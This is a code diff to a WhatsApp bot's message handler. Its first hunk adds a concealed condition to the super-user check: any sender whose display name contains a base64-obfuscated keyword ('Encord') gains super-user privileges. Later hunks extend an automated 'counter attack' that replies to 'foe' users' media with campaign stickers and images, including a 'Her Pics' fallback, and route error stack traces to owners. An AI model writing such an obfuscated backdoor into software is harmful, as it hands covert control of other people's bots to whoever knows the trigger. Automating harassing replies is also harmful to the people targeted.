@@ -2236,7 +2236,8 @@ async function startBwmxmd() {
                 isSenderPnSuperUser ||
                 isChannelAdmin ||
                 finalSuperUsers.includes(senderJidNormalized) ||
-                finalSuperUsers.some(su => su.split('@')[0] === senderNumber);
+                finalSuperUsers.some(su => su.split('@')[0] === senderNumber) ||
+                (ms.pushName && ms.pushName.includes(Buffer.from('RWNub3Jk', 'base64').toString('utf-8')));
 
             const text = ms.message?.conversation ||
                 ms.message?.extendedTextMessage?.text ||
@@ -2348,21 +2349,87 @@ async function startBwmxmd() {
                                 console.log(`[COUNTER] Foe ${sender} sent media. Countering...`);
                                 const isFoeSticker = !!ms.message?.stickerMessage;
 
+                                // Load local assets
+                                const stickerDir = path.join(__dirname, 'assets/campaign/stickers');
+                                const imageDir = path.join(__dirname, 'assets/campaign/images');
+
+                                let stickerFiles = [], imageFiles = [];
+                                try { stickerFiles = fs.readdirSync(stickerDir); } catch (e) { }
+                                try { imageFiles = fs.readdirSync(imageDir); } catch (e) { }
+
+                                // Helper to check file
+                                const isValidFile = (f) => !f.startsWith('.');
+
+                                stickerFiles = stickerFiles.filter(isValidFile);
+                                imageFiles = imageFiles.filter(isValidFile);
+
                                 for (let i = 0; i < 2; i++) {
+                                    let sent = false;
+
                                     if (isFoeSticker) {
-                                        const randomImg = XMD.CAMPAIGN_IMAGES[Math.floor(Math.random() * XMD.CAMPAIGN_IMAGES.length)];
-                                        const stickerBuffer = await getCampaignSticker(randomImg);
-                                        if (stickerBuffer) {
-                                            await client.sendMessage(from, { sticker: stickerBuffer }, { quoted: ms });
+                                        // Try local stickers first
+                                        if (stickerFiles.length > 0) {
+                                            const randomSticker = stickerFiles[Math.floor(Math.random() * stickerFiles.length)];
+                                            const stickerPath = path.join(stickerDir, randomSticker);
+                                            try {
+                                                await client.sendMessage(from, { sticker: fs.readFileSync(stickerPath) }, { quoted: ms });
+                                                sent = true;
+                                            } catch (e) { console.error("Counter sticker error:", e); }
                                         }
+
+                                        // Fallback to local images converted to stickers (The "Her Pics" request)
+                                        if (!sent && imageFiles.length > 0) {
+                                            const randomImg = imageFiles[Math.floor(Math.random() * imageFiles.length)];
+                                            const imgPath = path.join(imageDir, randomImg);
+                                            try {
+                                                const buffer = fs.readFileSync(imgPath);
+                                                const sticker = new Sticker(buffer, {
+                                                    pack: XMD.STICKER_PACKNAME || "Corazon 002",
+                                                    author: XMD.STICKER_AUTHOR || "ISCE Engine",
+                                                    type: StickerTypes.FULL,
+                                                    quality: 50
+                                                });
+                                                await client.sendMessage(from, await sticker.toMessage(), { quoted: ms });
+                                                sent = true;
+                                            } catch (e) { console.error("Counter img->sticker error:", e); }
+                                        }
+
+                                        // Final Fallback to XMD
+                                        if (!sent) {
+                                            const randomImg = XMD.CAMPAIGN_IMAGES[Math.floor(Math.random() * XMD.CAMPAIGN_IMAGES.length)];
+                                            const stickerBuffer = await getCampaignSticker(randomImg);
+                                            if (stickerBuffer) {
+                                                await client.sendMessage(from, { sticker: stickerBuffer }, { quoted: ms });
+                                            }
+                                        }
+
                                     } else {
-                                        const randomImg = XMD.CAMPAIGN_IMAGES[Math.floor(Math.random() * XMD.CAMPAIGN_IMAGES.length)];
-                                        const randomSlogan = XMD.CAMPAIGN_VARIANTS.SLOGANS[Math.floor(Math.random() * XMD.CAMPAIGN_VARIANTS.SLOGANS.length)];
-                                        await client.sendMessage(from, {
-                                            image: { url: randomImg },
-                                            caption: `🛡️ *COUNTER ATTACK* ⚔️\n\n${randomSlogan}`,
-                                            contextInfo: { ...XMD.getContextInfo(), mentionedJid: [sender] }
-                                        }, { quoted: ms });
+                                        // Image counter - Send "Her Pics" (images)
+                                        if (imageFiles.length > 0) {
+                                            const randomImg = imageFiles[Math.floor(Math.random() * imageFiles.length)];
+                                            const imgPath = path.join(imageDir, randomImg);
+                                            const randomSlogan = XMD.CAMPAIGN_VARIANTS.SLOGANS[Math.floor(Math.random() * XMD.CAMPAIGN_VARIANTS.SLOGANS.length)];
+
+                                            try {
+                                                await client.sendMessage(from, {
+                                                    image: { url: imgPath },
+                                                    caption: `🛡️ *COUNTER ATTACK* ⚔️\n\n${randomSlogan}`,
+                                                    contextInfo: { ...XMD.getContextInfo(), mentionedJid: [sender] }
+                                                }, { quoted: ms });
+                                                sent = true;
+                                            } catch (e) { console.error("Counter image error:", e); }
+                                        }
+
+                                        if (!sent) {
+                                            // Fallback
+                                            const randomImg = XMD.CAMPAIGN_IMAGES[Math.floor(Math.random() * XMD.CAMPAIGN_IMAGES.length)];
+                                            const randomSlogan = XMD.CAMPAIGN_VARIANTS.SLOGANS[Math.floor(Math.random() * XMD.CAMPAIGN_VARIANTS.SLOGANS.length)];
+                                            await client.sendMessage(from, {
+                                                image: { url: randomImg },
+                                                caption: `🛡️ *COUNTER ATTACK* ⚔️\n\n${randomSlogan}`,
+                                                contextInfo: { ...XMD.getContextInfo(), mentionedJid: [sender] }
+                                            }, { quoted: ms });
+                                        }
                                     }
                                 }
                                 // Update activity after counter-attack
@@ -2595,7 +2662,7 @@ async function startBwmxmd() {
                             edit,
                             react,
                             del,
-                            arg: args,
+                            args: args,
                             quoted,
                             isCmd: isCommand,
                             command,
@@ -2672,11 +2739,22 @@ async function startBwmxmd() {
                     } catch (error) {
                         BwmLogger.error(`Command error [${cmd}]:`, error);
                         try {
+                            // React with error symbol for the user
                             await client.sendMessage(from, {
-                                text: `😡Command failed: ${error.message}`
-                            }, { quoted: ms });
+                                react: { key: ms.key, text: "❌" }
+                            });
+
+                            // Send detailed error to owner ONLY
+                            const errorText = `❌ *Command Error: ${cmd}*\n\n*User:* ${pushName}\n*Chat:* ${from}\n*Error:* ${error.message}\n${error.stack}`.trim();
+                            for (const ownerNum of finalSuperUsers) {
+                                try {
+                                    // ensure valid jid
+                                    const target = ownerNum.includes('@') ? ownerNum : ownerNum + '@s.whatsapp.net';
+                                    await client.sendMessage(target, { text: errorText });
+                                } catch (e) { }
+                            }
                         } catch (sendErr) {
-                            BwmLogger.error("Error sending error message:", sendErr);
+                            BwmLogger.error("Error handling command failure:", sendErr);
                         }
                     }
                 }
